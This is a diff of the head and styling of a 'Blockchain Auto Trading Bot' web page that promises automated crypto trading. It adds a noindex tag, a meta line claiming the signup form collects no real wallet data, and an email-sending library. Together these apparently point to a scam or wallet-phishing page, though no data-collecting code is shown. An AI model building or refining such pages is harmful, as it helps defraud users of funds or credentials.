@@ -1,102 +1,104 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Blockchain Auto Trading Bot</title>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <style>
-    body {
-      background-color: #0b1234;
-      color: white;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      margin: 0;
-      padding: 0;
-    }
-    main {
-      max-width: 480px;
-      margin: 50px auto;
-      background: #111a3a;
-      padding: 30px 20px;
-      border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.7);
-    }
-    h1, h2 {
-      color: #f0c040;
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    p {
-      font-size: 1rem;
-      line-height: 1.6;
-      text-align: center;
-    }
-    input, button {
-      width: 100%;
-      padding: 12px;
-      font-size: 16px;
-      margin-top: 10px;
-      border-radius: 8px;
-      border: none;
-    }
-    input {
-      background: #1c2541;
-      color: #fff;
-    }
-    button {
-      background-color: #0b5ed7;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #0946a3;
-    }
-    .btn-outline {
-      background-color: transparent;
-      border: 2px solid #0b5ed7;
-      color: #0b5ed7;
-    }
-    .btn-outline:hover {
-      background-color: #0b5ed7;
-      color: white;
-    }
-    .nav-button {
-      margin-top: 20px;
-      color: #f0c040;
-      text-align: center;
-      cursor: pointer;
-      display: inline-block;
-    }
-    .hidden {
-      display: none;
-    }
-    ul {
-      text-align: left;
-      max-width: 400px;
-      margin: 1rem auto 2rem;
-      padding-left: 0;
-      font-size: 0.95rem;
-      list-style: none;
-    }
-    ul li {
-      margin-bottom: 0.5rem;
-    }
-    .error {
-      color: #ff4d4d;
-      font-size: 0.9rem;
-      margin-top: 10px;
-    }
-    .loading {
-      color: #f0c040;
-      font-weight: bold;
-      margin-top: 10px;
-    }
-  </style>
-</head>
-<body>
+<!DOCTYPE html>    <html lang="en">    
+<head>    
+  <meta charset="UTF-8" />    
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />    
+<meta name="description" content="Secure signup form for your blockchain dashboard. We do not collect real wallet data.">    
+<meta name="robots" content="noindex">   
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />   
+  <title>Blockchain Auto Trading Bot</title>    
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>    
+  <style>    
+    body {    
+      background-color: #0b1234;    
+      color: white;    
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;    
+      margin: 0;    
+      padding: 0;    
+    }    
+    main {    
+      max-width: 480px;    
+      margin: 50px auto;    
+      background: #111a3a;    
+      padding: 30px 20px;    
+      border-radius: 12px;    
+      box-shadow: 0 0 15px rgba(0,0,0,0.7);    
+    }    
+    h1, h2 {    
+      color: #f0c040;    
+      text-align: center;    
+      margin-bottom: 20px;    
+    }    
+    p {    
+      font-size: 1rem;    
+      line-height: 1.6;    
+      text-align: center;    
+    }    
+    input, button {    
+      width: 100%;    
+      padding: 12px;    
+      font-size: 16px;    
+      margin-top: 10px;    
+      border-radius: 8px;    
+      border: none;    
+    }    
+    input {    
+      background: #1c2541;    
+      color: #fff;    
+    }    
+    button {    
+      background-color: #0b5ed7;    
+      color: white;    
+      font-weight: bold;    
+      cursor: pointer;    
+    }    
+    button:hover {    
+      background-color: #0946a3;    
+    }    
+    .btn-outline {    
+      background-color: transparent;    
+      border: 2px solid #0b5ed7;    
+      color: #0b5ed7;    
+    }    
+    .btn-outline:hover {    
+      background-color: #0b5ed7;    
+      color: white;    
+    }    
+    .nav-button {    
+      margin-top: 20px;    
+      color: #f0c040;    
+      text-align: center;    
+      cursor: pointer;    
+      display: inline-block;    
+    }    
+    .hidden {    
+      display: none;    
+    }    
+    ul {    
+      text-align: left;    
+      max-width: 400px;    
+      margin: 1rem auto 2rem;    
+      padding-left: 0;    
+      font-size: 0.95rem;    
+      list-style: none;    
+    }    
+    ul li {    
+      margin-bottom: 0.5rem;    
+    }    
+    .error {    
+      color: #ff4d4d;    
+      font-size: 0.9rem;    
+      margin-top: 10px;    
+    }    
+    .loading {    
+      color: #f0c040;    
+      font-weight: bold;    
+      margin-top: 10px;    
+    }    
+  </style>    
+</head>    
+<body>   
   <main>
-    <!-- Landing Page -->
+    <!--PAGE 1: Landing Page -->
     <section id="page1">
       <h1>Welcome to Blockchain Auto Trading Bot</h1>
       <p><strong>24/7 Intelligent Crypto Trading. Powered by Blockchain.</strong><br><br>
